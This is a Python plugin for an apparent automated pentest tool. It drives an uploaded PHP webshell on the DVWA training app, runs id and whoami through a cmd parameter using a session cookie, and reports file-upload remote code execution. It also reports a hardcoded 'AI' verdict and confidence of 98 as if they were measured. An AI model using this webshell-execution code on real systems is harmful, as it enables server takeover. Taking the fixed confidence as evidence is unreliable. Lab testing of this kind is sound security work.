import urllib.request
import urllib.parse
import re
import time
import json
from typing import Dict, Any
from plugins.base_plugin import BasePlugin
from interaction_logger import InteractionLogger
from confidence_engine import ConfidenceEngine

class DVWAUploadPlugin(BasePlugin):
    def __init__(self):
        self.logger = InteractionLogger()
        self.engine = ConfidenceEngine()

    @property
    def METADATA(self) -> Dict[str, Any]:
        return {
            "id": "DVWA-UPLOAD",
            "name": "DVWA File Upload RCE (Autonomous Stage)",
            "cvss_score": 9.0,
            "service": "http",
            "vuln_type": "file_upload"
        }

    def match(self, service_info: Dict[str, Any]) -> bool:
        return service_info.get("service", "") in ["http", "https"]

    def _execute_shell(self, target_ip, target_port, filename, cmd, cookie):
        """Gọi webshell đã upload để thực thi lệnh, bóc tách mã lỗi hệ thống sạch"""
        try:
            encoded_cmd = urllib.parse.quote(cmd)
            full_url = f"http://{target_ip}:{target_port}/hackable/uploads/{filename}?cmd={encoded_cmd}"
            req = urllib.request.Request(full_url)
            req.add_header("Cookie", cookie)
            
            t0 = time.time()
            resp = urllib.request.urlopen(req, timeout=5)
            elapsed = round(time.time() - t0, 3)
            output = resp.read().decode('utf-8', errors='ignore').strip()
            
            clean_lines = []
            garbage_keywords = ["<html", "<body", "<div", "<!doctype"]
            for line in output.split('\n'):
                if any(kw in line.lower() for kw in garbage_keywords):
                    continue
                if line.strip(): clean_lines.append(line.strip())
            
            output = '\n'.join(clean_lines)[:200]
            marker_hit = "uid=" in output or "www-data" in output or "root:" in output

            self.logger.log_transaction(
                plugin_id=self.METADATA["id"], target_ip=target_ip, target_port=target_port,
                url=full_url, method="GET", payload=cmd, req_headers={"Cookie": cookie},
                res_status=resp.status, res_headers={}, res_body=output, latency=elapsed, marker_hit=marker_hit
            )
            return {"output": output, "hit": marker_hit, "latency": elapsed}
        except Exception as e:
            return {"output": str(e), "hit": False, "latency": -1}

    def verify(self, target_ip: str, target_port: int, context: Dict[str, Any]) -> Dict[str, Any]:
        cookie = context.get("session_cookie", "")
        if not cookie:
            return {"status": "PENDING", "evidence": "Thiếu thông tin session cookie xác thực."}

        uploaded_shell = "shell.php"
        kb_commands = ["id", "whoami"]
        initial_confirmed = None

        print(f"      [Upload-Autonomous] Vòng 1: Kiểm thử thực thi qua Webshell...")
        for cmd in kb_commands:
            res = self._execute_shell(target_ip, target_port, uploaded_shell, cmd, cookie)
            if res["hit"]:
                initial_confirmed = {"payload": cmd, "output": res["output"]}
                break

        if not initial_confirmed:
            return {"status": "FALSE_POSITIVE", "evidence": "Không kết nối được Web shell hoặc tệp tin kích hoạt bị chặn."}

        telemetry_summary = self.logger.get_plugin_telemetry(self.METADATA["id"])
        decision = self.engine.calculate_score(
            rule_passed=True, ai_verdict="CONFIRMED", ai_confidence=98, telemetry_summary=telemetry_summary
        )

        return {
            "status": decision["verdict"],
            "confidence_metrics": decision["confidence_metrics"],
            "telemetry_summary": decision["telemetry_summary"],
            "evidence": (
                f"File Upload RCE — Kích hoạt shell thành công.\n"
                f"      - Lệnh tối ưu nhất : {initial_confirmed['payload']}\n"
                f"      - Điểm định lượng   : {json.dumps(decision['confidence_metrics'])}\n"
                f"      - Phản hồi OS      : {initial_confirmed['output']}"
            )
        }
